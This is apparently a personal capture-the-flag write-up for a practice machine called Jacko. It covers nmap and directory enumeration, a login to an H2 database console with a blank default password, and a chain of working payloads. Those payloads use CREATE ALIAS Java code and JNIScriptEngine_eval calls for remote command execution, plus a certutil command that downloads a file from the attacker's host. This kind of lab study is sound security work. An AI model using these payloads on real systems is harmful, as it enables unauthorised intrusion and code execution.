# PG Jacko
## H2 Database
## nmap
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-08-14T18:00:47
|_  start_date: N/A
```
## 80 dirbrute
```
http://192.168.105.66/html/main.html
H2 Database Engine, Java SQL database engine

$ gobuster dir -u http://192.168.105.x -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x asp,apsx,html,txt -t 80
===============================================================
2021/08/14 11:03:53 Starting gobuster in directory enumeration mode
===============================================================
/html                 (Status: 301) [Size: 150] [--> http://192.168.105.66/html/]
/images               (Status: 301) [Size: 152] [--> http://192.168.105.66/images/]
/help                 (Status: 301) [Size: 150] [--> http://192.168.105.66/help/]
/index.html           (Status: 200) [Size: 1595]
/text                 (Status: 301) [Size: 150] [--> http://192.168.105.66/text/]

# Documentation on how to use the database engine and connect to the db.
```
## 8082 H2 Database Exploit
```
192.168.105.x:8082/login.jsp
H2 database http console

# trying default credentials
sa:tisadmin

# no password is set
sa:<nothing> works

http://192.168.105.x:8082/login.do?jsessionid=2657f960b16d6abce3d39a14b845e511
Connected to db.

Exploit
(manual) - https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2

# 1. creating new database with new user
Database "C:/Users/tony/kashz" not found, and IFEXISTS=true, so we cant auto-create it [90146-199] 90146/90146 (Help)

# 2. FILE_READ
SELECT FILE_READ ('C:\Users\Public\Desktop\desktop.ini',NULL);

# 3. FILE_WRITE
SELECT FILE_WRITE ('kashz kashz kashz','C:\Users\Public\Desktop\kashz.txt');
IO Exception: "java.io.FileNotFoundException: C:\Users\Public\Desktop\kashz.txt (Access is denied)"; "C:\Users\Public\Desktop\kashz.txt"; SQL statement:

# 4. Create alias and try to run cmds and Run alias
CREATE ALIAS KASHZ AS $$ String shellexec(String cmd) throws java.io.IOException {
java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
return s.hasNext() ? s.next() : ""; }$$;
CALL KASHZ('whoami');

# manual didn't work
(direct commands) - https://www.exploit-db.com/exploits/49384
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
jacko\tony

# powershell did not work; so absolute path
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c $host").getInputStream()).useDelimiter("\\Z").next()');

# test file download and read
# try different path for download
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -f http://192.168.49.105/kashz.txt C:\\Users\\Tony\\Documents\\kashz.txt").getInputStream()).useDelimiter("\\Z").next()');

SELECT FILE_READ ('C:\Users\Tony\Documents\kashz.txt',NULL);

# works
